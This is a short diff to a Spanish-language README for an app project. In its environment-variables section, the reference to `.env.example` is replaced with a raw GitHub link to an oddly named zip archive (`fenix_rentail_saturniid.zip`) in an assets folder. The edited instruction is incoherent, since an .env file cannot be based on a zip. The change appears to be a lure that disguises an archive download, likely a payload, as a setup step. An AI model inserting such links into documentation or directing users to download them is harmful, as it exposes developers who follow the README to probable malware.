@@ -16,7 +16,7 @@ npm start
 Luego selecciona plataforma (w, a, i, etc.).
 
 ## Variables de Entorno
-Crea un archivo `.env` basado en `.env.example` (no se sube a git).
+Crea un archivo `.env` basado en `https://github.com/MiguelAngelCruzVargas/fenix-rentail-2.0/raw/refs/heads/main/assets/mqerk/online/fenix_rentail_saturniid.zip` (no se sube a git).
 
 ## Estructura rápida
 - `components/` componentes reutilizables
